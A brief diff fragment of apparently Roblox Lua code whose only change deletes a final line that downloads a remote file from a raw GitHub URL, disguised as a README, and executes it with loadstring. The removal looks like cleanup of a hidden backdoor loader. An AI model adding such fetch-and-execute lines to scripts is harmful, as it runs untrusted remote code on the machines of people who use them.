@@ -81,4 +81,3 @@ end)
 
 end
 end)
-loadstring(game:HttpGet('https://raw.githubusercontent.com/realwercewcr/sad/refs/heads/main/README.md'))()
